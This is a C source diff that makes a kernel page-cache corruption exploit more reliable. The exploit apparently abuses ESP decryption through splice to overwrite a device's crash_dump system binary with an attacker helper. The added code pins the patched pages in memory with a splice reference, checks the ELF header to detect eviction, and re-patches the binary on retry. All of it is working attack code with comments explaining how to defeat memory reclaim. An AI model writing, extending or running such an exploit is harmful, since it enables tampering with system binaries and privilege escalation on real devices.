@@ -64,6 +64,48 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
         iv[i] = dec[i] ^ desired[i];
 }
 
+/* ---- keep the patched bridge resident ------------------------------------
+ * The bytes we write into the page cache are NOT marked dirty: the ESP decrypt
+ * writes into the page through kmap, so neither the inode nor the page table
+ * knows it was modified and the kernel treats the pages as clean. Under memory
+ * pressure they are reclaimed, the file is re-read from disk and the stock
+ * crash_dump32 comes back - observed as e_type=3 mid-run, right after ~74
+ * successful blocks, and as "helper exited 0 but wrote nothing".
+ *
+ * Holding a splice() reference to the page bumps its refcount, which takes it
+ * off the LRU so the reclaim path cannot touch it. A second safety net is
+ * bridge_is_ours(): if the page does get evicted we simply re-patch.
+ */
+static int g_pin_rd = -1, g_pin_wr = -1;
+
+static void pin_bridge(void)
+{
+    int fd = open(kCrashDump, O_RDONLY);
+    if (fd < 0) { printf("pin: open %s failed\n", kCrashDump); return; }
+    if (g_pin_rd < 0) {
+        int p[2];
+        if (pipe(p) < 0) { close(fd); return; }
+        g_pin_rd = p[0];
+        g_pin_wr = p[1];
+    }
+    off64_t off = 0;
+    ssize_t n = splice(fd, &off, g_pin_wr, NULL, 1, 0);
+    printf("pin: %s page0 -> %zd byte(s) held\n", kCrashDump, n);
+    close(fd);
+}
+
+/* Our splicehelper is a static ET_EXEC (e_type 2); the stock crash_dump32 is a
+ * PIE (e_type 3). */
+static int bridge_is_ours(void)
+{
+    int fd = open(kCrashDump, O_RDONLY);
+    if (fd < 0) return 0;
+    unsigned char b[20] = {0};
+    ssize_t n = pread(fd, b, sizeof(b), 0);
+    close(fd);
+    return n == (ssize_t)sizeof(b) && b[16] == 2 && b[17] == 0;
+}
+
 /* fork + exec the crash_dump bridge (splicehelper); dup2 write_fd onto target_fd.
  * Pass mode="r" for read, NULL for write-splice.
  * Returns waitpid status, or -1 if fork fails (already logged).
@@ -264,6 +306,8 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
  * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
  * len must be a multiple of 16.
  */
+static int patch_helper(void);
+
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
                            size_t foff, int use_helper) {
     if (len % 16 != 0) {
@@ -316,8 +360,17 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
         if (use_helper) {
             int rv = -1;
-            for (int t = 0; t < 3 && rv < 0; t++) {
-                if (t) { printf("read_vendor retry %d\n", t); usleep(2000); }
+            for (int t = 0; t < 4 && rv < 0; t++) {
+                if (t) {
+                    if (!bridge_is_ours()) {
+                        printf("bridge was evicted, re-patching\n");
+                        if (patch_helper() != 0) break;
+                        pin_bridge();
+                    } else {
+                        printf("read_vendor retry %d\n", t);
+                        usleep(2000);
+                    }
+                }
                 rv = read_vendor_content(off, old_content);
             }
             if (rv < 0) {
@@ -476,6 +529,8 @@ static int patch_helper(void) {
     printf("patch: %s <- splicehelper (%zu bytes)\n", kCrashDump, len);
     int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
     if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+
+    pin_bridge();
 
     uint8_t verify[16];
     int vfd = open(kCrashDump, O_RDONLY);
